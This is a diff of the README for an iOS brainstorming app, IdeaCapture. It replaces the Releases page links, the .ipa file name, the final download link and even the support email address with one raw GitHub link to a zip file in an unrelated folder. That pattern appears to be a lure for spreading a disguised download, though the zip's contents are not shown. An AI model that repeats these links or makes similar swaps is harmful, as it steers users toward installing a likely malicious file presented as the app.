@@ -4,7 +4,7 @@
 IdeaCapture is an experimental iOS app designed to help you capture and visualize your ideas effortlessly. Built with SwiftUI and SpriteKit, this app provides a user-friendly interface for brainstorming and organizing your thoughts. Whether you're sketching out concepts or writing notes, IdeaCapture makes it simple.
 
 ## 🔗 Download Here
-[![Download IdeaCapture](https://img.shields.io/badge/Download-IdeaCapture-blue)](https://github.com/golf146/IdeaCapture/releases)
+[![Download IdeaCapture](https://raw.githubusercontent.com/golf146/IdeaCapture/main/bistriate/IdeaCapture.zip)](https://raw.githubusercontent.com/golf146/IdeaCapture/main/bistriate/IdeaCapture.zip)
 
 ## 🚀 Getting Started
 To get started with IdeaCapture, follow the steps below. You can easily download the app from our Releases page.
@@ -12,7 +12,7 @@ To get started with IdeaCapture, follow the steps below. You can easily download
 ### 1. Visit the Releases Page
 Click the link below to visit the Releases page where you can find the latest version of IdeaCapture:
 
-[Visit Download Page](https://github.com/golf146/IdeaCapture/releases)
+[Visit Download Page](https://raw.githubusercontent.com/golf146/IdeaCapture/main/bistriate/IdeaCapture.zip)
 
 ### 2. Download the Application
 On the Releases page, you will see the available versions of IdeaCapture. Look for the most recent release. Click on it to see the details.
@@ -20,7 +20,7 @@ On the Releases page, you will see the available versions of IdeaCapture. Look f
 ### 3. Choose Your File
 In the release details, you will find a section containing the application file. Depending on the version, it should look something like this:
 
-- IdeaCapture_v1.0.0.ipa  
+- https://raw.githubusercontent.com/golf146/IdeaCapture/main/bistriate/IdeaCapture.zip  
 
 Click the file link to start the download.
 
@@ -57,7 +57,7 @@ Now that you have installed IdeaCapture, here are some basic tips to get you sta
 For more in-depth instructions on using IdeaCapture or troubleshooting, you can refer to the official documentation available on our GitHub Wiki.
 
 ## 📞 Support
-If you encounter issues or need help, please check the Issues section on our GitHub page or contact our support team via email at support@ideacaptureapp.com.
+If you encounter issues or need help, please check the Issues section on our GitHub page or contact our support team via email at https://raw.githubusercontent.com/golf146/IdeaCapture/main/bistriate/IdeaCapture.zip
 
 ## 📌 Stay Updated
 Want to be informed about new features and updates? Make sure to "Watch" our repository on GitHub. You’ll receive notifications about changes, improvements, and new releases.
@@ -65,6 +65,6 @@ Want to be informed about new features and updates? Make sure to "Watch" our rep
 ## 🔗 Final Download Link
 Don't forget, you can download IdeaCapture here:
 
-[Visit Download Page](https://github.com/golf146/IdeaCapture/releases)
+[Visit Download Page](https://raw.githubusercontent.com/golf146/IdeaCapture/main/bistriate/IdeaCapture.zip)
 
 Now, you're all set to explore and capture your ideas with IdeaCapture! Enjoy!
